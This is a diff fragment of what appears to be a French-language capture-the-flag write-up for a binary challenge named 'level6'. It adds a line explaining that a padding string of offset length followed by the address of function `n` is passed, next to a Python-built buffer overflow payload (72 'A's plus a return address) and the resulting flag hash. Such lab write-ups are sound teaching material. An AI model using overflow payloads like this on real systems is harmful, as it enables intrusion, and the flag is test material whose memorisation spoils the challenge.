@@ -84,6 +84,7 @@
     0xbffff748 : 0xbffff87d ($sp + 0xcc [51 dwords])
     ```
 
+- On passe alors en paramètre une chaine de la taille de l'offset, suivie de l'adresse de la fonction `n`
 - `./level6 $(python -c 'print("A"*72+"\x54\x84\x04\x08")')`
 > f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
